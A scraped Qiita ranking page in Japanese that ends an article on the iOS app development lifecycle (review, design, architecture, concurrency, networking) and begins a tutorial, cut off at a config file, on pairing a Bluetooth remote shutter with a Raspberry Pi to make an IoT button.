<p>　いよいよリリースしても問題ないという段階が近づいてきたら、アプリの動作確認項目一覧表などを作り第三者にチェックをお願いすると、より安定したアプリをストアに出すことができると思います。これは一般的に品質保証（QA）のステップとよばれることが多いです。</p>

<h2>
<span id="25-審査提出とリジェクト対応" class="fragment"></span><a href="#25-%E5%AF%A9%E6%9F%BB%E6%8F%90%E5%87%BA%E3%81%A8%E3%83%AA%E3%82%B8%E3%82%A7%E3%82%AF%E3%83%88%E5%AF%BE%E5%BF%9C"><i class="fa fa-link"></i></a>2.5. 審査提出とリジェクト対応</h2>

<p>　大きなアプリとなると一発で審査をパスするのは難しく、Appleから何らかの指摘を受けてリジェクトされると思っておいたほうがよいでしょう。あらかじめリジェクトされることを想定して、ある程度アプリが出来上がってきたら、とりあえず審査に出してみるのも戦略のひとつです。これによりリジェクト対応のための仕様変更が生じる点を早めに知ることができます。</p>

<h2>
<span id="26-リリース" class="fragment"></span><a href="#26-%E3%83%AA%E3%83%AA%E3%83%BC%E3%82%B9"><i class="fa fa-link"></i></a>2.6. リリース</h2>

<p>　審査に通過したら晴れてアプリをApp Storeにリリースすることができます。審査提出時にはリリースタイミングのオプションがあり、そこで指定されたとおりにリリースが行われます。オプションは以下の通りです。</p>

<ul>
<li>手動でリリース: 審査通過後、リリースボタンを押したタイミングでリリースされる</li>
<li>自動でリリース: 審査通過後、自動でリリースされる</li>
<li>指定時刻以降に自動でリリース: 審査通過後、指定の時刻を過ぎたタイミングでリリースされる</li>
</ul>

<p>　なお、オプションはiTunes Connectというアプリの管理に使われているサービスの仕様変更によって変わる可能性があります。</p>

<h1>
<span id="3-iosアプリのデザイン" class="fragment"></span><a href="#3-ios%E3%82%A2%E3%83%97%E3%83%AA%E3%81%AE%E3%83%87%E3%82%B6%E3%82%A4%E3%83%B3"><i class="fa fa-link"></i></a>3. iOSアプリのデザイン</h1>

<p>　iOSアプリのUI/UXに関してはAppleが公式に「iOSヒューマンインターフェースガイドライン」を制定しています。ガイドラインに沿わないデザインや実装を行うと一部は審査でリジェクトされる可能性があるため、開発を始める前にざっくりと目を通しておくとよいでしょう。ここではアプリ全体のデザインに影響してくるポイントを数点、記述します。</p>

<h2>
<span id="31-なるべく標準uiに沿ったデザインにする" class="fragment"></span><a href="#31-%E3%81%AA%E3%82%8B%E3%81%B9%E3%81%8F%E6%A8%99%E6%BA%96ui%E3%81%AB%E6%B2%BF%E3%81%A3%E3%81%9F%E3%83%87%E3%82%B6%E3%82%A4%E3%83%B3%E3%81%AB%E3%81%99%E3%82%8B"><i class="fa fa-link"></i></a>3.1. なるべく標準UIに沿ったデザインにする</h2>

<p>　特段デザインにこだわりがなければ、iOSのメールやSafari、設定画面などの標準的なアプリに沿った形でUIコンポーネントを利用し、画面を構成していくのがよいでしょう。UIコンポーネントを過剰にカスタムして使うと、場合によってはユーザーがどのように利用すればよいのか迷ってしまう可能性があります。また、iOSバージョン間で見た目や振る舞いを統一するのが難しくなり、最悪の場合は特定バージョンにおいて期待した動作を提供できなかったり、クラッシュを引き起こしたりする原因にもなります。</p>

<h2>
<span id="32-アプリ内の画面遷移" class="fragment"></span><a href="#32-%E3%82%A2%E3%83%97%E3%83%AA%E5%86%85%E3%81%AE%E7%94%BB%E9%9D%A2%E9%81%B7%E7%A7%BB"><i class="fa fa-link"></i></a>3.2 アプリ内の画面遷移</h2>

<p>　アプリを作る際に1画面だけで構成することは非常に稀で、ほとんどの場合には画面を遷移させる必要が出てくるでしょう。iOSの画面遷移には、主に次の2つのパターンが存在します。</p>

<ul>
<li>プッシュ遷移</li>
<li>モーダル遷移</li>
</ul>

<p>　プッシュ遷移とはiOSの設定画面などで見られる右方向に階層構造を掘るように遷移するタイプのものを指します。この遷移は、スワイプで戻ることができ、コンテンツ階層間の移動をスムーズに行うのに適しています。この階層構造は、提供するコンテンツの階層構造と揃えてあげるのが一般的で、ユーザーにも理解しやすい形になるでしょう。たとえば音楽プレイヤーであるiTunesアプリは、ライブラリ→プレイリスト一覧→プレイリスト→楽曲というコンテンツ階層構造になっています。当たり前のことではありますが、きちんと分類して構成されているアプリは意外に多くありません。アプリデザインの構成を考える際に同時に提供するコンテンツ階層構造を整理することは、きっとデザインをする上でも役に立つことでしょう。</p>

<p>　一方、モーダル遷移は、ビューが現れている間はその要素内でしか操作ができないようなものを指します。例えば、iOSのSafariのブックマーク一覧はこのタイプの遷移をします。また注意喚起のダイアログなどもモーダル遷移にあたります。何かオプションを指定したり選択したりする際に使われる傾向にあります。しかし、モーダルを閉じるには基本的にはタップをする必要があるため、ユーザーに煩わしさを感じさせてしまう可能性が高まります。最近は、モーダルビューを前の画面の上に浮いた状態で表示し、モーダル画面自体をスワイプすることで閉じる実装も目立つようになってきました。これにより閉じるためにタップをしなければならない問題が解消され、モーダル遷移に対するストレスを緩和させることができるため、可能であればそういった実装も考えてみると良いかもしれません。</p>

<h2>
<span id="33-デバイスの大型化とデザイン" class="fragment"></span><a href="#33-%E3%83%87%E3%83%90%E3%82%A4%E3%82%B9%E3%81%AE%E5%A4%A7%E5%9E%8B%E5%8C%96%E3%81%A8%E3%83%87%E3%82%B6%E3%82%A4%E3%83%B3"><i class="fa fa-link"></i></a>3.3. デバイスの大型化とデザイン</h2>

<p>　iPhone 6 PLUSの登場時には、そのデバイスの大きさに随分と驚いた方も多いのではないでしょうか。実際iPhone 5のデバイスサイズは4インチであったのに対して、iPhone 7 PLUSでは5.5インチになっています。解像度も高くなり表示領域が増え、デザイン表現の幅が広がったのは間違いありません。</p>

<p>　しかし、デバイスが大型化する一方で、人間の手の大きさは変わっていない点には注意する必要があります。右手でデバイスを操作する場合、左上や左下に配置したボタンなどには指が届きにくく、アプリのスムーズな操作の妨げになります。以前はモーダル画面の閉じるボタンを左上に配置するケースが目立っていたのですが、近年は右上や右下などに配置されているのをよく見ます。また、先述したとおり、モーダル画面自体を上下にスワイプすると閉じることができるように構成されているものもよく見ます。本質的には触り心地が良い形に画面を構成していければ、きっと良いアプリになるのではないかと考えています。</p>

<h1>
<span id="4-アプリをどのように構成すれば良いのか" class="fragment"></span><a href="#4-%E3%82%A2%E3%83%97%E3%83%AA%E3%82%92%E3%81%A9%E3%81%AE%E3%82%88%E3%81%86%E3%81%AB%E6%A7%8B%E6%88%90%E3%81%99%E3%82%8C%E3%81%B0%E8%89%AF%E3%81%84%E3%81%AE%E3%81%8B"><i class="fa fa-link"></i></a>4. アプリをどのように構成すれば良いのか</h1>

<p>　初めてアプリ開発をする際に何に気をつければよいのか、とても不安になる気持ちは非常にわかります。筆者も初めてアプリを構成する際に何かアプリ開発特有の構成・設計を取る必要があるのではないかと思い調査をしました。結局のところネイティブアプリは、裏で処理をしつつも、ユーザーの入力を常に待ち受けつづける必要があるため、UIスレッドをブロックしないように注意するという点に注意していれば、一般的なプログラミングとほとんどかわらないと思います。したがって基本的なプログラミングができる方は何も心配せず、以前から実践していた技法を使いアプリを構成することができるでしょう。</p>

<p>　iOSアプリ開発が本当に初めてである場合は、まずラベル（UILabel）、ボタン（UIButton）、テキストフィールド（UITextField）、画像（UIImage）などの基本的なコンポーネントの使い方を覚えると良いでしょう。続いて複雑なビューを構成する基本的な要素であるスタック（UIStackView）、テーブル（UITableView）、コレクション（UICollectionView）、スクロール（UIScrollView）、タブ（UITabBar）の使い方を学ぶと、自分の思い描いたビューを実現するための下地が整うのではないでしょうか。</p>

<h2>
<span id="41-複雑な設計を採用する前に考えたいこと" class="fragment"></span><a href="#41-%E8%A4%87%E9%9B%91%E3%81%AA%E8%A8%AD%E8%A8%88%E3%82%92%E6%8E%A1%E7%94%A8%E3%81%99%E3%82%8B%E5%89%8D%E3%81%AB%E8%80%83%E3%81%88%E3%81%9F%E3%81%84%E3%81%93%E3%81%A8"><i class="fa fa-link"></i></a>4.1. 複雑な設計を採用する前に考えたいこと</h2>

<p>　近年、iOSアプリ開発をする上でどのような設計手法を取るかというような話題をよくみかけます。「iOSクリーンアーキテクチャ」や「ヘキサゴナルアーキテクチャ」など熱心に議論が行われています。これらの議論や記事ではアプリの規模感についての前提が共有されていなケースが多く、場合によっては過剰な構成となり、コードの可読性や開発のスピードを下げてしまうこともあるでしょう。開発メンバー間で考え方も一致させていく必要があり、本当に必要なものが何なのかを見極めることが非常に重要です。</p>

<p>　iOSアプリのコードベースは往々にしてそれほど大規模なものにはならず、だいたい1万〜2万行程度で構成されることが多いと思います。アプリ全体のアーキテクチャパターンを考えることは確かに大切なことですが、私自身はSOLID原則やDRY原則、YAGNI原則などのシンプルで基本的なプログラミング原則を意識してコーディングしていくように心がけています。アーキテクチャのたくさんの決まりごとを意識しつづけるのは難しいことです。少数のシンプルで明確な決まりごとを意識していると実は自ずと、本に書かれているようなアーキテクチャになっていることは多々ありますし、そもそも複雑なアーキテクチャの根底思想にはシンプルな原理原則があることが多いと思います。</p>

<h2>
<span id="42-ライブラリの選定" class="fragment"></span><a href="#42-%E3%83%A9%E3%82%A4%E3%83%96%E3%83%A9%E3%83%AA%E3%81%AE%E9%81%B8%E5%AE%9A"><i class="fa fa-link"></i></a>4.2. ライブラリの選定</h2>

<p>　アプリのすべてのコードを自前で書くことは稀で、多くの場合オープンソースライブラリの助けを借りることになると思います。ライブラリをうまく使いこなせば大幅に開発期間を短縮することができ、場合によっては多くの人に使われたり、メンテナンスされているため、一人で書いたものに比べ品質の高いコードを利用することができるなどというメリットもあるでしょう。</p>

<p>　ただし、Swiftのライブラリについては、今後予想される言語自体のアップデートに継続的に対応させる必要があります。過去に大きな変更が幾度も入ったため、GitHubでStarがたくさんついていて、多くの開発者が利用しているライブラリでも、最新の言語バージョンにアップデート対応がされず、放置されていることは珍しくありません。利用する前に、メンテナンスが継続して行われているかをGitHubのPulseなどで確認しておくことをおすすめします。また、メンテナンスが止まってしまった場合、公開リポジトリからフォークして、自分でメンテナンスしていく覚悟が必要です。</p>

<p>　これはSwiftのライブラリに限ったことではないですが、基本的にはコードの8割程度をざっくりと斜め読みし、コードの設計・品質・メンテナビリティ・適切なテストが存在するかなどを確認してから依存を決めると失敗がないと思います。また利用した各ライブラリのライセンスを遵守し、必要であれば必ずライセンス表記をしましょう。</p>

<h2>
<span id="43-ライブラリへの依存" class="fragment"></span><a href="#43-%E3%83%A9%E3%82%A4%E3%83%96%E3%83%A9%E3%83%AA%E3%81%B8%E3%81%AE%E4%BE%9D%E5%AD%98"><i class="fa fa-link"></i></a>4.3. ライブラリへの依存</h2>

<p>　ライブラリを導入すると一口に言ってもいろいろなやり方があります。たとえば秘匿情報などを管理できるキーチェーンにアクセスするライブラリを使うことを想定してみましょう。何も考えずにViewControllerの必要な箇所でライブラリをimportして依存コードをばらまいていくというやり方は、最初の実装者にとっては一番手が抜けて楽かもしれません。しかしこれには大きな問題があります。ものにもよるとは思いますが、おそらくライブラリを利用している周辺のコードは似たような実装が繰り返し登場しているのではないでしょうか？またライブラリのインターフェースが変更されたり、利用するライブラリを差し替えたりする場合、あちこちに散らばったコードに手を加える必要がでてきます。</p>

<p>　したがって、個人的にはライブラリを利用する際にはなるべく依存コードを記述する範囲を狭くするように意識することが多いです。大半の場合はひとつのクラスの中に閉じ込めることができるはずで、その上でプロトコルを切り、実装クラスを差し替えられるような構造にするのが好みです。こうすることによってライブラリを差し替えたり、自前の実装に切り替えたりするなどの対応も容易になります。またテストの書きやすさにも繋がる場合もあると思います。</p>

<h1>
<span id="5-アプリと非同期処理" class="fragment"></span><a href="#5-%E3%82%A2%E3%83%97%E3%83%AA%E3%81%A8%E9%9D%9E%E5%90%8C%E6%9C%9F%E5%87%A6%E7%90%86"><i class="fa fa-link"></i></a>5. アプリと非同期処理</h1>

<p>　ユーザーインターフェースの存在するアプリは常にユーザーからの入力を受け付ける状態を保たなければならないという制約があります。したがって、何か重たい処理をするときは別のスレッドに仕事を任せる必要があります。この重い処理にはどんなものがあるでしょうか。例えばサーバーにデータを取得する際はリクエストを送ってからレスポンスが帰ってくるまで時間がかかります。この間ユーザーの入力を一切受け付けないアプリは控えめにいって最悪でしょう。また画像の変換や複雑な計算などはユーザーからのアプリへの入力をブロックしてしまいます。</p>

<p>　これを避けるためには、重たい処理はユーザーからの入力を受け付ける担当とは別のものに任せればよいでしょう。ユーザーからの入力を受け付けている窓口はメインスレッドとよばれています。対してその裏で処理を行なっているものをバックグラウンドスレッドとよんでいます。また、あるタスクの実行を止めずに別の処理を行うことを非同期処理と言います。iOSアプリ開発において非同期処理はスレッドを利用して実現されていますが、Swift, Objective-Cからは開発者が直接スレッドを触ることなく非同期処理を取り扱える仕組みが用意されています。それがGrand Central Dispatch（GCD）とオペレーションキューになります。それぞれどのようなものかざっくりと特徴をみていきます。また、Appleが公式で提供している「並列プログラミングガイド」および「スレッドプログラミングガイド」を参照するとコードレベルの技術詳細に迫ることができると思いますので、ご覧ください。</p>

<h2>
<span id="51-grand-central-dispatchgcd" class="fragment"></span><a href="#51-grand-central-dispatchgcd"><i class="fa fa-link"></i></a>5.1. Grand Central Dispatch（GCD）</h2>

<p>　GCDを利用する場合もオペレーションキューを使う場合も、基本的にはキューにジョブを積むというのが基本的な実装内容になると思います。ではこの2つの何が違うのかというと、用意されているキューの種類とジョブをクロージャで渡すのか、オブジェクトで渡すのかという点になります。</p>

<p>　GCDには、キューイングされた処理を逐次実行していく直列ディスパッチキュー（Serial Dispatch Queue）と並列に実行していくのが並列ディスパッチキュー（Concurrent Dispatch Queue）が用意されています。さらに特別なキューとしてメインスレッドで行いたいタスクをキューイングするためのメインディスパッチキューというものが用意されています。メインスレッドはひとつしかなく、並列にできないので当たり前ではあるのですが、これは構造的には直列ディスパッチキューになります。</p>

<p>　さて、実際のアプリの中でこれらがどのように利用されるかを少し想像してみましょう。例えばボタンを押したイベントを皮切りにサーバーにHTTP通信を走らせ、その結果をテキストボックスに表示するケースを考えてみましょう。最初にメインスレッドがボタンの押下イベントを受け付け、イベントハンドラを呼び出します。続いて、イベントハンドラは並列ディスパッチキューにクロージャをわたして、あとの処理をバックグラウンドスレッドにお任せします。このように、裏側で行わせたい仕事をキューに積んで放置することにより、ユーザーからの入力を受け付けられる体制に即座に戻ります。一方、バックグラウンドスレッドではどのようなことが行われているでしょうか。並列ディスパッチキューに渡されたクロージャの中身をみてみましょう。まずHTTPリクエストをサーバーに送るでしょう。そしてレスポンスが帰ってきたら、そのデータをよしなに加工して、テキストボックスに反映させる必要があります。このときに注意が必要で、基本的にUIコンポーネントを更新する際はメインスレッドでやる必要があります。したがって、加工し終わったデータの準備ができたら、今度はメインスレッドに処理を行わせるための直列ディスパッチキュー（DispatchQueue.main）にクロージャでお仕事を渡します。お仕事内容は単純にデータをテキストボックスに反映させるだけです。</p>

<h2>
<span id="52-オペレーションキュー" class="fragment"></span><a href="#52-%E3%82%AA%E3%83%9A%E3%83%AC%E3%83%BC%E3%82%B7%E3%83%A7%E3%83%B3%E3%82%AD%E3%83%A5%E3%83%BC"><i class="fa fa-link"></i></a>5.2. オペレーションキュー</h2>

<p>　オペレーションキューを用いる非同期処理では、タスクを表現したデータ構造であるOperationを作り、キューに渡していくという流れになります。したがってあらかじめタスクを仕込んでおいて一気に並列/直列で実行するなどということが可能です。実際のところGCDのラッパーでしかないため動作原理はほぼほぼ同じになります。しかし、クロージャではなくタスクというオブジェクトを引き回せることでより柔軟で複雑なプログラミングが可能になると思います。</p>

<h2>
<span id="53-スレッドセーフな実装" class="fragment"></span><a href="#53-%E3%82%B9%E3%83%AC%E3%83%83%E3%83%89%E3%82%BB%E3%83%BC%E3%83%95%E3%81%AA%E5%AE%9F%E8%A3%85"><i class="fa fa-link"></i></a>5.3. スレッドセーフな実装</h2>

<p>　複数のスレッド間で共有されるオブジェクトは不正な状態になる可能性をはらんでいます。不変なオブジェクトであれば問題はないですが、状態を持つオブジェクトには不正な状態になることを防ぐための実装を施してあげる必要があります。一般にマルチスレッド間でのオブジェクト共有に対して安全であることをスレッドセーフな実装とよんでいます。スレッドセーフな実装を実現させるためのツールにはアトミック操作とメモリバリア、ロック、条件変数などがあります。それぞれ特徴が異なっており、用途に適したものを利用する必要があります。詳細についてはAppleが公式で提供している「スレッドプログラミングガイド」を読むと良いと思います。</p>

<h1>
<span id="6-アプリ内通信のこれから" class="fragment"></span><a href="#6-%E3%82%A2%E3%83%97%E3%83%AA%E5%86%85%E9%80%9A%E4%BF%A1%E3%81%AE%E3%81%93%E3%82%8C%E3%81%8B%E3%82%89"><i class="fa fa-link"></i></a>6. アプリ内通信のこれから</h1>

<p>　多くのアプリではウェブAPIを利用したり、画像/音声/動画リソースをインターネット上から取得します。これからSwift/Objective-Cで開発をはじめようという方はどのようにしてHTTPリクエストを走らせるのかという点が気になるのではないでしょうか。</p>

<p>　ネットで検索をするとAFNetworkingやAlamofireといったライブラリの名前がヒットすると思います。しかし個人的には標準で提供されているURLSessionで十分足りると考えています。複雑なPOSTリクエストの組み立てなどには一部ライブラリの助けがあると楽をすることができるかもしれませんが、それを除けばライブラリに実装されている機能を利用する機会はそれほど多くないでしょう。通信ライブラリに限らない話ですが、本当にそのライブラリを導入する必要があるのか、よく検討してみてください。</p>

<h2>
<span id="61-app-transport-security" class="fragment"></span><a href="#61-app-transport-security"><i class="fa fa-link"></i></a>6.1. App Transport Security</h2>

<p>　App Transport Security（ATS）とはiOS9.0以降で導入されたサーバークライアント間でのセキュアな通信を保証するための仕組みです。Appleが推奨するTLSバージョンと暗号スイート、サーバー証明書とそのハッシュアルゴリズム、サーバー証明書の署名キーを満たしていない場合に接続エラーとなります。</p>

<p>　2017年4月現在ではATSに対応することは必須ではなく、HTTP通信やAppleの推奨条件を満たさないHTTPS通信を行いたい場合は、Info.plistに設定を追加することでATSによる接続エラーを回避することができます。しかしながら、AppleはATSに正当な理由なく対応していないアプリをリジェクトするとの予告を出しており、今後アプリ開発をしていく上ではこれに対応することはほぼ間違いなく必須条件となるでしょう。</p>

<p>　少なくとも自前で立てているサーバーと通信を行う場合は、Appleが定めた推奨条件に対応させましょう。ただし自分の管理外サーバーとの通信を行う場合は、ATSに対応しない正当な理由として認められるようです。</p>

<h2>
<span id="62-apiクライアントは人間の書くものではない" class="fragment"></span><a href="#62-api%E3%82%AF%E3%83%A9%E3%82%A4%E3%82%A2%E3%83%B3%E3%83%88%E3%81%AF%E4%BA%BA%E9%96%93%E3%81%AE%E6%9B%B8%E3%81%8F%E3%82%82%E3%81%AE%E3%81%A7%E3%81%AF%E3%81%AA%E3%81%84"><i class="fa fa-link"></i></a>6.2. APIクライアントは人間の書くものではない</h2>

<blockquote>
<p>注意：この文章は今年の2月くらいに書いたものです</p>
</blockquote>

<p>　大半のアプリではREST APIを叩き、そのレスポンスをもとにビューを更新するなどの処理が入るのではないでしょうか。こんなときにはAPIクライアントの実装が必要になるでしょう。</p>

<p>　残念ながらSwiftでAPIクライアントを書く作業はSwiftyではありません。URLSessionを用いてレスポンスを取得し、正常なリソースが得られたらJSONなりXMLなりをパースしてJSONObjectを手に入れます。続いてJSONObjectの各キーから値を取り出してSwiftで定義したエンティティの構造体にマッピングします。JavaやC#などを使うとシリアライズやデシリアライズの工程はだいたい手で書く必要はなく、十分に実績のあるライブラリが自動的にやってくれるため、とてもSwiftyなのですが、Swiftには現在そのような機能を実現するライブラリは存在しないようにみえます。またあらかじめスキーマが決まっているエンティティの構造体を書くのも非常に面倒臭い作業で自動化したい機運が高まります。</p>

<p>　APIクライアントのレイヤーを自動で解決するための方法はいくつかあります。ひとつ目はSwaggerというREST API作成のためのフレームワークを利用する手法です。仕様を表現したYAMLファイルから自動でAPIクライアントのコードを生成できるのが特徴です。</p>

<p>　またREST APIからは外れますが、Protocol Buffersを使うことによりデシリアライズやエンティティの作成を自動化できます。こちらはサーバー側から送出されるレスポンスもProtocol Buffersに対応させなければならないため、自前のサーバーを利用したアプリ作成のときに使える手段となります。サーバーとクライアント間の通信も含めて、すべて自動でコード生成したい場合はRPCフレームワークのgRPCの利用を検討してみてください。</p>

<h1>
<span id="7-ユーザーに笑顔を届けるまでがios開発" class="fragment"></span><a href="#7-%E3%83%A6%E3%83%BC%E3%82%B6%E3%83%BC%E3%81%AB%E7%AC%91%E9%A1%94%E3%82%92%E5%B1%8A%E3%81%91%E3%82%8B%E3%81%BE%E3%81%A7%E3%81%8Cios%E9%96%8B%E7%99%BA"><i class="fa fa-link"></i></a>7. ユーザーに笑顔を届けるまでがiOS開発</h1>

<p>　Appleによる過酷なダンジョンを切り抜けついに審査を切り抜けたみなさんは、ついにリリースボタンを押すことになるでしょう。いままで開発をすすめてきたメンバーと一緒にリリースボタンを押すとウェイ感がでてとてもエモいので是非おためしください。</p>

<h2>
<span id="71-appstoreのねぼすけ" class="fragment"></span><a href="#71-appstore%E3%81%AE%E3%81%AD%E3%81%BC%E3%81%99%E3%81%91"><i class="fa fa-link"></i></a>7.1. AppStoreのねぼすけ</h2>

<p>　さて、時間はお昼の12時、無事リリースボタンを押した我々はAppStoreに飛び、アプリをダウンロードしてみようと試みます。しかしながら、アプリは見当たりません。Appleの実装はとてもlazy（怠惰）なのでリリースボタンを押してから反映までに30〜60分程度要すると思っていただいてよいでしょう。もし決まった時間にプレスリリースやSNSなどでリリース告知をする際には、あらかじめこっそりとアプリをリリースして、AppStoreに反映させておくのが良いと思います。</p>

<p>　そんなこんなでアプリは13時にはストアに反映されていたとしましょう。ところがtwitterでエゴサするとダウンロードがうまくできないとの酷評が。リリースと同時につけられる1ツ星評価。実際のところ何が原因か分かっていないのですが、お昼の時間帯などはAppStoreからのダウンロードがうまくいかないときがあるようで、個人的にはリリースはアプリのユーザーがアクティブでなくなってくる時間帯にするようにしています。個人的にはAppStoreのアプリ配信サーバーを増強してほしいという気持ちをここに掲載させていただきます。</p>

<h2>
<span id="72-俺たちの闘いはこれからだ" class="fragment"></span><a href="#72-%E4%BF%BA%E3%81%9F%E3%81%A1%E3%81%AE%E9%97%98%E3%81%84%E3%81%AF%E3%81%93%E3%82%8C%E3%81%8B%E3%82%89%E3%81%A0"><i class="fa fa-link"></i></a>7.2. 俺たちの闘いはこれからだ！</h2>

<p>　アプリをリリースして、開発を終わらせるぞ！そう思っていた時期が私にもありました。しかしアプリ開発はリリースしてからが本番です。まずは多くのユーザーに使ってもらうためにきっと様々な仕掛けが必要でしょう。また発生させてしまった不具合の対応や、アプリをさらに快適に利用できるような新機能の提供などやることはたくさんあるはずです。そう、俺たちの闘いはこれからだ！</p>

<hr>

<p>ソースコードが一切でてきてないのでこのエントリは Qiita 運営に消されそう</p>

<p>現場からは以上です</p>
</div>
	</td>
</tr>
</table>
<br />
<table border="1" style="height:150px;">
<tr>
	<td rowspan="3">12位</td>
	<td colspan="4">
		<kbd><i><img alt="いいね" width="16" height="16" src="thumb-up-120px.png" /></i>536</kbd>
		<a target="_blank" href="https://qiita.com/vimyum/items/8b7548ca8cf45383c5b0">わずか300円でIoTボタンを作る方法</a>
	</td>
</tr>
<tr>
	<td style="width:100px;"><center>投稿日時</center></td>
	<td style="width:200px;"><center>投稿者</center></td>
	<td style="width:150px;"><center>タグ</center></td>
	<td style="width:350px;"><center>本文</center></td>
</tr>
<tr>
	<td style="width:100px;">
		<!--投稿日時--><center>2017-10-07<br />03:04:41</center>
	</td>
	<td style="width:200px;">
		<!--投稿者-->
		<center>
			@<a href="user/160451.html">vimyum</a>(11件の記事)<br><img width="80" height="80" src="https://qiita-image-store.s3.amazonaws.com/0/160451/profile-images/1506421538">
		</center>
	</td>
	<td style="width:150px;">
		<!--タグ-->
		<center><b>[Node.js]</b> <b>[RaspberryPi]</b> <b>[bluetooth]</b> <b>[IoT]</b> </center>
	</td>
	<td style="width:350px;">
		<!--本文-->
		<div style="width:350px;height:150px;overflow-x:hidden;overflow-y:scroll;">
<h1>
<span id="こんなの見つけたよ" class="fragment"></span><a href="#%E3%81%93%E3%82%93%E3%81%AA%E3%81%AE%E8%A6%8B%E3%81%A4%E3%81%91%E3%81%9F%E3%82%88"><i class="fa fa-link"></i></a>こんなの見つけたよ</h1>

<p>100円ショップで物色していたら、こんなものを見つけたよ。100円ショップなのに300円※だったけど、いろいろ遊べそうなので思わず衝動買いしてしまったよ。 (※あとで<a href="https://www.amazon.co.jp/Bluetooth-%E3%82%B9%E3%83%9E%E3%83%BC%E3%83%88%E3%83%95%E3%82%A9%E3%83%B3%E7%94%A8-%E3%82%AB%E3%83%A1%E3%83%A9%E3%83%AA%E3%83%A2%E3%82%B3%E3%83%B3-Shutter-ABS3-BLK/dp/B00JX70WK4" rel="nofollow noopener" target="_blank">Amazon</a>をみてみたら1円から売ってました<img alt=":cry:" class="emoji" height="20" src="https://cdn.qiita.com/emoji/twemoji/unicode/1f622.png" title=":cry:" width="20">）<br>
<a href="https://camo.qiitausercontent.com/e0754eb112419d03f944a5a7b8454ddde6442cf1/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f3136303435312f64366537306134652d316532312d376266622d663835632d3932356637333565326263302e706e67" target="_blank" rel="nofollow noopener"><img src="https://camo.qiitausercontent.com/e0754eb112419d03f944a5a7b8454ddde6442cf1/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f3136303435312f64366537306134652d316532312d376266622d663835632d3932356637333565326263302e706e67" width="40%" data-canonical-src="https://qiita-image-store.s3.amazonaws.com/0/160451/d6e70a4e-1e21-7bfb-f85c-925f735e2bc0.png"></a></p>

<p>Bluetoothでスマホにコマンドを送れるってことは、スマホではなくラズパイとBluetoothでつなげられれば、物理ボタンとWebを連携させるIoTっぽいことができそうだね。例えばボタンを押すとAmazonで注文できるなんちゃってDashボタンとか。今回は、LINEにメッセージをPush通知するLINEボタンをつくってみるよ。</p>

<h1>
<span id="準備するもの" class="fragment"></span><a href="#%E6%BA%96%E5%82%99%E3%81%99%E3%82%8B%E3%82%82%E3%81%AE"><i class="fa fa-link"></i></a>準備するもの</h1>

<ul>
<li>Raspberry-Pi3 (BluetoothがついてればOK)</li>
<li>リモートシャッター (AB Shutter 3)</li>
</ul>

<h1>
<span id="つくりかた" class="fragment"></span><a href="#%E3%81%A4%E3%81%8F%E3%82%8A%E3%81%8B%E3%81%9F"><i class="fa fa-link"></i></a>つくりかた</h1>

<h2>
<span id="ラズパイとリモートシャッターとの接続" class="fragment"></span><a href="#%E3%83%A9%E3%82%BA%E3%83%91%E3%82%A4%E3%81%A8%E3%83%AA%E3%83%A2%E3%83%BC%E3%83%88%E3%82%B7%E3%83%A3%E3%83%83%E3%82%BF%E3%83%BC%E3%81%A8%E3%81%AE%E6%8E%A5%E7%B6%9A"><i class="fa fa-link"></i></a>ラズパイとリモートシャッターとの接続</h2>

<p>まずはラズパイとリモートシャッターをBluetoothでペアリングするよ。Bluetoothを使うために必要なパッケージをラズパイにインストールだ。</p>

<div class="code-frame" data-lang="bash"><div class="highlight"><pre><span></span>sudo apt-get install bluez bluetooth libbluetooth-dev build-essential
</pre></div></div>

<p>次はbluetoothのペアリングだ。リモートシャッターは側面のスイッチをオンにするとしばらくペアリング待ち状態になるよ。ラズパイにて<code>bluetoothctl</code>コマンドでペアリングしよう。名前が<code>AB Shutter3</code>となっているデバイスがリモートシャッターだ。</p>

<div class="code-frame" data-lang="bash"><div class="highlight"><pre><span></span>$ bluetoothctl
<span class="o">[</span>bluetooth<span class="o">]</span><span class="c1"># power on</span>
<span class="o">[</span>bluetooth<span class="o">]</span><span class="c1"># scan on　←リモートシャッターをペアリング待ちにしておく</span>
...
Device FF:FF:7F:F1:XX:XX AB Shutter3 ←これがリモートシャッター
...
<span class="o">[</span>bluetooth<span class="o">]</span><span class="c1"># info FF:FF:7F:F1:XX:XX</span>
Device FF:FF:7F:F1:XX:XX
    Name: AB Shutter3       
    Alias: AB Shutter3       
    Appearance: 0x03c1
    Icon: input-keyboard
    Paired: yes
    Trusted: yes
    Blocked: no
    Connected: no
    LegacyPairing: no
    UUID: Generic Access Profile    <span class="o">(</span><span class="m">00001800</span>-0000-1000-8000-00805f9b34fb<span class="o">)</span>
    UUID: Generic Attribute Profile <span class="o">(</span><span class="m">00001801</span>-0000-1000-8000-00805f9b34fb<span class="o">)</span>
    UUID: Device Information        <span class="o">(</span>0000180a-0000-1000-8000-00805f9b34fb<span class="o">)</span>
    UUID: Battery Service           <span class="o">(</span>0000180f-0000-1000-8000-00805f9b34fb<span class="o">)</span>
    UUID: Human Interface Device    <span class="o">(</span><span class="m">00001812</span>-0000-1000-8000-00805f9b34fb<span class="o">)</span>
    Modalias: usb:v248Ap8266d0001
<span class="o">[</span>bluetooh<span class="o">]</span><span class="c1"># pair F:FF:7F:F1:XX:XX</span>
</pre></div></div>

<h2>
<span id="ボタン操作の検知" class="fragment"></span><a href="#%E3%83%9C%E3%82%BF%E3%83%B3%E6%93%8D%E4%BD%9C%E3%81%AE%E6%A4%9C%E7%9F%A5"><i class="fa fa-link"></i></a>ボタン操作の検知</h2>

<p>ペアリングが完了したら、今度はリモートシャッターのボタンの操作を検知するプログラムを開発するぞ！<img alt=":muscle_tone2:" class="emoji" height="20" src="https://cdn.qiita.com/emoji/twemoji/unicode/1f4aa-1f3fc.png" title=":muscle_tone2:" width="20">、、と思ったら、すでに完成しているものをGitHubで見つけてしまった。。「<a href="https://github.com/kinnalru/bluebutton" rel="nofollow noopener" target="_blank">bluebutton</a>」というソフトウェアだ。長押しと通常押しも見分けられるようだ。Ruby2以上が必要なのでさっそくインストールしよう。</p>

<div class="code-frame" data-lang="bash"><div class="highlight"><pre><span></span>sudo apt-get install ruby
sudo gem install bluebutton
</pre></div></div>

<p>設定ファイルにてボタンを押されたときの動作を自分で決めることができるようだ。<code>~/config/bluebutton</code>というファイル名で下記のファイルをつくったよ。</p>

